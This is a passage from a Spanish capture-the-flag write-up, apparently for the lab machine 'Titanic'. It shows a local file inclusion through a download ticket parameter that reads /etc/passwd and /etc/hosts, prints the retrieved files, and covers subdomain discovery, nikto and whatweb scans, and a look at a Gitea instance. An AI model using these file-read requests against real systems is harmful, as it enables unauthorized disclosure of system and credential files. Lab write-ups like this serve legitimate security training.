+El nombre del archivo es el siguiente <code>4852d90d-7587-420d-91e7-b4f84f2c539c.json</code> parece que se genera un archivo de nombre aleatorio con el contenido rellenado del formulario;</p></div><div class="el-pre"><pre class="language-json" tabindex="0"><code data-line="0" class="language-json is-loaded"> <span class="token punctuation">{</span><span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"cher0"</span><span class="token punctuation">,</span> <span class="token property">"email"</span><span class="token operator">:</span> <span class="token string">"none@mail.com"</span><span class="token punctuation">,</span> <span class="token property">"phone"</span><span class="token operator">:</span> <span class="token string">"12345678"</span><span class="token punctuation">,</span> <span class="token property">"date"</span><span class="token operator">:</span> <span class="token string">"0002-02-02"</span><span class="token punctuation">,</span> <span class="token property">"cabin"</span><span class="token operator">:</span> <span class="token string">"Standard"</span><span class="token punctuation">}</span>
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">capturamos la peticion que enviamos al servidor cuando clickeamos <code>submit</code><br>
+<span alt="Pasted image 20250217170358.png" src="Pasted image 20250217170358.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250217170358.png" src="machines/titanic/imgs/pasted-image-20250217170358.png"></span></p></div><div class="el-p"><p dir="auto">Nos redirige a la url <code>http://titanic.htb/download?ticket=65449497-ae16-43b2-99f3-09656003ff09.json</code></p></div></div></div></div></div></div></div><div class="el-h2 heading-wrapper"><h2 data-heading="LFI" dir="auto" class="heading" id="LFI"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>LFI</h2><div class="heading-children"><div class="el-p"><p dir="auto">Probamos a cambiar el nombre del archivo y nos da un not found; pero podemos leer archivos del sistema poniendo una ruta; realmente arcaico típico de la época del titanic.<br>
+<span alt="Pasted image 20250217170935.png" src="Pasted image 20250217170935.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250217170935.png" src="machines/titanic/imgs/pasted-image-20250217170935.png"></span><br>
+LFI:</p></div><div class="el-pre"><pre class="language-http" tabindex="0"><code data-line="0" class="language-http is-loaded"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//titanic.htb/download?ticket=/etc/passwd</span></span>
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Nos descarga el siguiente archivo: <code> _etc_passwd</code></p></div><div class="el-h3 heading-wrapper"><h3 data-heading="/etc/passwd" dir="auto" class="heading" id="/etc/passwd"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>/etc/passwd</h3><div class="heading-children"><div class="el-pre"><pre class="language-java" tabindex="0"><code data-line="0" class="language-java is-loaded">➜  nmap cat <span class="token operator">--</span>plain <span class="token operator">~</span><span class="token operator">/</span><span class="token class-name">Descargas</span><span class="token operator">/</span>_etc_passwd 
+root<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">:</span>root<span class="token operator">:</span><span class="token operator">/</span>root<span class="token operator">:</span><span class="token operator">/</span>bin<span class="token operator">/</span>bash
+daemon<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span>daemon<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+bin<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">2</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">:</span>bin<span class="token operator">:</span><span class="token operator">/</span>bin<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+sys<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">3</span><span class="token operator">:</span><span class="token number">3</span><span class="token operator">:</span>sys<span class="token operator">:</span><span class="token operator">/</span>dev<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+sync<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">4</span><span class="token operator">:</span><span class="token number">65534</span><span class="token operator">:</span>sync<span class="token operator">:</span><span class="token operator">/</span>bin<span class="token operator">:</span><span class="token operator">/</span>bin<span class="token operator">/</span>sync
+games<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">5</span><span class="token operator">:</span><span class="token number">60</span><span class="token operator">:</span>games<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>games<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+man<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">6</span><span class="token operator">:</span><span class="token number">12</span><span class="token operator">:</span>man<span class="token operator">:</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>cache<span class="token operator">/</span>man<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+lp<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">7</span><span class="token operator">:</span><span class="token number">7</span><span class="token operator">:</span>lp<span class="token operator">:</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>spool<span class="token operator">/</span>lpd<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+mail<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">8</span><span class="token operator">:</span><span class="token number">8</span><span class="token operator">:</span>mail<span class="token operator">:</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>mail<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+news<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">9</span><span class="token operator">:</span><span class="token number">9</span><span class="token operator">:</span>news<span class="token operator">:</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>spool<span class="token operator">/</span>news<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+uucp<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">10</span><span class="token operator">:</span>uucp<span class="token operator">:</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>spool<span class="token operator">/</span>uucp<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+proxy<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">13</span><span class="token operator">:</span><span class="token number">13</span><span class="token operator">:</span>proxy<span class="token operator">:</span><span class="token operator">/</span>bin<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+www<span class="token operator">-</span>data<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">33</span><span class="token operator">:</span><span class="token number">33</span><span class="token operator">:</span>www<span class="token operator">-</span>data<span class="token operator">:</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+backup<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">34</span><span class="token operator">:</span><span class="token number">34</span><span class="token operator">:</span>backup<span class="token operator">:</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>backups<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+list<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">38</span><span class="token operator">:</span><span class="token number">38</span><span class="token operator">:</span><span class="token class-name">Mailing</span> <span class="token class-name">List</span> <span class="token class-name">Manager</span><span class="token operator">:</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>list<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+irc<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">39</span><span class="token operator">:</span><span class="token number">39</span><span class="token operator">:</span>ircd<span class="token operator">:</span><span class="token operator">/</span>run<span class="token operator">/</span>ircd<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+gnats<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">41</span><span class="token operator">:</span><span class="token number">41</span><span class="token operator">:</span><span class="token class-name">Gnats</span> <span class="token class-name">Bug</span><span class="token operator">-</span><span class="token class-name">Reporting</span> <span class="token class-name">System</span> <span class="token punctuation">(</span>admin<span class="token punctuation">)</span><span class="token operator">:</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>gnats<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+nobody<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">65534</span><span class="token operator">:</span><span class="token number">65534</span><span class="token operator">:</span>nobody<span class="token operator">:</span><span class="token operator">/</span>nonexistent<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+_apt<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">100</span><span class="token operator">:</span><span class="token number">65534</span><span class="token operator">::</span><span class="token operator">/</span>nonexistent<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+systemd<span class="token operator">-</span>network<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">101</span><span class="token operator">:</span><span class="token number">102</span><span class="token operator">:</span>systemd <span class="token class-name">Network</span> <span class="token class-name">Management</span><span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token operator">/</span>run<span class="token operator">/</span>systemd<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+systemd<span class="token operator">-</span>resolve<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">102</span><span class="token operator">:</span><span class="token number">103</span><span class="token operator">:</span>systemd <span class="token class-name">Resolver</span><span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token operator">/</span>run<span class="token operator">/</span>systemd<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+messagebus<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">103</span><span class="token operator">:</span><span class="token number">104</span><span class="token operator">::</span><span class="token operator">/</span>nonexistent<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+systemd<span class="token operator">-</span>timesync<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">104</span><span class="token operator">:</span><span class="token number">105</span><span class="token operator">:</span>systemd <span class="token class-name">Time</span> <span class="token class-name">Synchronization</span><span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token operator">/</span>run<span class="token operator">/</span>systemd<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+pollinate<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">105</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">::</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>cache<span class="token operator">/</span>pollinate<span class="token operator">:</span><span class="token operator">/</span>bin<span class="token operator">/</span><span class="token boolean">false</span>
+sshd<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">106</span><span class="token operator">:</span><span class="token number">65534</span><span class="token operator">::</span><span class="token operator">/</span>run<span class="token operator">/</span>sshd<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+syslog<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">107</span><span class="token operator">:</span><span class="token number">113</span><span class="token operator">::</span><span class="token operator">/</span>home<span class="token operator">/</span>syslog<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+uuidd<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">108</span><span class="token operator">:</span><span class="token number">114</span><span class="token operator">::</span><span class="token operator">/</span>run<span class="token operator">/</span>uuidd<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+tcpdump<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">109</span><span class="token operator">:</span><span class="token number">115</span><span class="token operator">::</span><span class="token operator">/</span>nonexistent<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+tss<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">110</span><span class="token operator">:</span><span class="token number">116</span><span class="token operator">:</span><span class="token constant">TPM</span> software stack<span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>tpm<span class="token operator">:</span><span class="token operator">/</span>bin<span class="token operator">/</span><span class="token boolean">false</span>
+landscape<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">111</span><span class="token operator">:</span><span class="token number">117</span><span class="token operator">::</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>landscape<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+fwupd<span class="token operator">-</span>refresh<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">112</span><span class="token operator">:</span><span class="token number">118</span><span class="token operator">:</span>fwupd<span class="token operator">-</span>refresh user<span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token operator">/</span>run<span class="token operator">/</span>systemd<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+usbmux<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">113</span><span class="token operator">:</span><span class="token number">46</span><span class="token operator">:</span>usbmux daemon<span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>usbmux<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+developer<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">1000</span><span class="token operator">:</span><span class="token number">1000</span><span class="token operator">:</span>developer<span class="token operator">:</span><span class="token operator">/</span>home<span class="token operator">/</span>developer<span class="token operator">:</span><span class="token operator">/</span>bin<span class="token operator">/</span>bash
+lxd<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">999</span><span class="token operator">:</span><span class="token number">100</span><span class="token operator">::</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>snap<span class="token operator">/</span>lxd<span class="token operator">/</span>common<span class="token operator">/</span>lxd<span class="token operator">:</span><span class="token operator">/</span>bin<span class="token operator">/</span><span class="token boolean">false</span>
+dnsmasq<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">114</span><span class="token operator">:</span><span class="token number">65534</span><span class="token operator">:</span>dnsmasq<span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>misc<span class="token operator">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
+_laurel<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">998</span><span class="token operator">:</span><span class="token number">998</span><span class="token operator">::</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>laurel<span class="token operator">:</span><span class="token operator">/</span>bin<span class="token operator">/</span><span class="token boolean">false</span>
+
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Usuarios del sistema:</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">root:x:0:0:root:/root:/bin/bash
+developer:x:1000:1000:developer:/home/developer:/bin/bash
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="Archivo hosts" dir="auto" class="heading" id="Archivo_hosts"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Archivo hosts</h3><div class="heading-children"><div class="el-p"><p dir="auto">Sacamos el /etc/hosts del sistema mediante el LFI;</p></div><div class="el-pre"><pre class="language-http" tabindex="0"><code data-line="0" class="language-http is-loaded"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//titanic.htb/download?ticket=/etc/hosts</span></span>
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">descubrimos el subdominio dev.titanic.htb; podriamos haberlo sacado por fuzzing facilmente</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token number">127.0</span>.0.1 localhost titanic.htb dev.titanic.htb
+<span class="token number">127.0</span>.1.1 titanic
+
+<span class="token comment"># The following lines are desirable for IPv6 capable hosts</span>
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div></div></div></div></div><div class="el-h2 heading-wrapper"><h2 data-heading="Subdominio dev.titanic.htb" dir="auto" class="heading" id="Subdominio_dev.titanic.htb"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Subdominio dev.titanic.htb</h2><div class="heading-children"><div class="el-p"><p dir="auto">Lo anadimos a nuestro /etc/hosts:</p></div><div class="el-pre"><pre class="language-http" tabindex="0"><code data-line="0" class="language-http is-loaded">10.10.11.55 titanic.htb dev.titanic.htb
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">➜  ~ nikto <span class="token parameter variable">--url</span> http://dev.titanic.htb
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          <span class="token number">10.10</span>.11.55
++ Target Hostname:    dev.titanic.htb
++ Target Port:        <span class="token number">80</span>
++ Start Time:         <span class="token number">2025</span>-02-17 <span class="token number">18</span>:09:06 <span class="token punctuation">(</span>GMT1<span class="token punctuation">)</span>
+---------------------------------------------------------------------------
++ Server: Apache/2.4.52 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="token keyword">in</span> a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found <span class="token punctuation">(</span>use <span class="token string">'-C all'</span> to force check all possible <span class="token function">dirs</span><span class="token punctuation">)</span>
++ Apache/2.4.52 appears to be outdated <span class="token punctuation">(</span>current is at least Apache/2.4.54<span class="token punctuation">)</span>. Apache <span class="token number">2.2</span>.34 is the EOL <span class="token keyword">for</span> the <span class="token number">2</span>.x branch.
++ /v2/_catalog: Uncommon header <span class="token string">'docker-distribution-api-version'</span> found, with contents: registry/2.0.
++ OPTIONS: Allowed HTTP Methods: ARRAY<span class="token punctuation">(</span>0x55cdda20bb60<span class="token punctuation">)</span> <span class="token builtin class-name">.</span>
++ ERROR: Error limit <span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> reached <span class="token keyword">for</span> host, giving up. Last error: 
++ Scan terminated: <span class="token number">0</span> error<span class="token punctuation">(</span>s<span class="token punctuation">)</span> and <span class="token number">4</span> item<span class="token punctuation">(</span>s<span class="token punctuation">)</span> reported on remote <span class="token function">host</span>
++ End Time:           <span class="token number">2025</span>-02-17 <span class="token number">18</span>:14:57 <span class="token punctuation">(</span>GMT1<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token number">351</span> seconds<span class="token punctuation">)</span>
+---------------------------------------------------------------------------
++ <span class="token number">1</span> host<span class="token punctuation">(</span>s<span class="token punctuation">)</span> tested
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-h3 heading-wrapper"><h3 data-heading="Gitea" dir="auto" class="heading" id="Gitea"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Gitea</h3><div class="heading-children"><div class="el-p"><p dir="auto">Nos encontramos con un Gitea:<br>
+<span alt="Pasted image 20250217171840.png" src="Pasted image 20250217171840.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250217171840.png" src="machines/titanic/imgs/pasted-image-20250217171840.png"></span></p></div><div class="el-pre"><pre class="language-python" tabindex="0"><code data-line="0" class="language-python is-loaded">➜  <span class="token operator">~</span> whatweb http<span class="token punctuation">:</span><span class="token operator">//</span>dev<span class="token punctuation">.</span>titanic<span class="token punctuation">.</span>htb
+http<span class="token punctuation">:</span><span class="token operator">//</span>dev<span class="token punctuation">.</span>titanic<span class="token punctuation">.</span>htb <span class="token punctuation">[</span><span class="token number">200</span> OK<span class="token punctuation">]</span> Apache<span class="token punctuation">[</span><span class="token number">2.4</span><span class="token number">.52</span><span class="token punctuation">]</span><span class="token punctuation">,</span> Cookies<span class="token punctuation">[</span>_csrf<span class="token punctuation">,</span>i_like_gitea<span class="token punctuation">]</span><span class="token punctuation">,</span> Country<span class="token punctuation">[</span>RESERVED<span class="token punctuation">]</span><span class="token punctuation">[</span>ZZ<span class="token punctuation">]</span><span class="token punctuation">,</span> HTML5<span class="token punctuation">,</span> HTTPServer<span class="token punctuation">[</span>Ubuntu Linux<span class="token punctuation">]</span><span class="token punctuation">[</span>Apache<span class="token operator">/</span><span class="token number">2.4</span><span class="token number">.52</span> <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> HttpOnly<span class="token punctuation">[</span>_csrf<span class="token punctuation">,</span>i_like_gitea<span class="token punctuation">]</span><span class="token punctuation">,</span> IP<span class="token punctuation">[</span><span class="token number">10.10</span><span class="token number">.11</span><span class="token number">.55</span><span class="token punctuation">]</span><span class="token punctuation">,</span> Meta<span class="token operator">-</span>Author<span class="token punctuation">[</span>Gitea <span class="token operator">-</span> Git <span class="token keyword">with</span> a cup of tea<span class="token punctuation">]</span><span class="token punctuation">,</span> Open<span class="token operator">-</span>Graph<span class="token operator">-</span>Protocol<span class="token punctuation">[</span>website<span class="token punctuation">]</span><span class="token punctuation">,</span> PoweredBy<span class="token punctuation">[</span>Gitea<span class="token punctuation">]</span><span class="token punctuation">,</span> Script<span class="token punctuation">,</span> Title<span class="token punctuation">[</span>Gitea<span class="token punctuation">:</span> Git <span class="token keyword">with</span> a cup of tea<span class="token punctuation">]</span><span class="token punctuation">,</span> X<span class="token operator">-</span>Frame<span class="token operator">-</span>Options<span class="token punctuation">[</span>SAMEORIGIN<span class="token punctuation">]</span>
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">encuentro la versión de gitea; la 1.22.1 mirando el source code; desgraciadamente no encuentro un exploit o alguna vulnerabilidad en esta versión; hay un XSS para la 1.22 que en esta versión esta parcheada; Vuln: <a rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/exploits/52077" target="_blank">https://www.exploit-db.com/exploits/52077</a></p></div><div class="el-p"><p dir="auto">Nos registramos en Gitea y entramos en explore; <code>http://dev.titanic.htb/explore/repos</code><br>
+<span alt="Pasted image 20250217183141.png" src="Pasted image 20250217183141.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250217183141.png" src="machines/titanic/imgs/pasted-image-20250217183141.png"></span><br>
+encontramos un par de repositorios de developer; les echamos un ojo</p></div><div class="el-h4 heading-wrapper"><h4 data-heading="docker-config" dir="auto" class="heading" id="docker-config"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>docker-config</h4><div class="heading-children"><div class="el-h5 heading-wrapper"><h5 data-heading="Mysql" dir="auto" class="heading" id="Mysql"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Mysql</h5><div class="heading-children"><div class="el-p"><p dir="auto"><span alt="Pasted image 20250217183246.png" src="Pasted image 20250217183246.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250217183246.png" src="machines/titanic/imgs/pasted-image-20250217183246.png"></span><br>
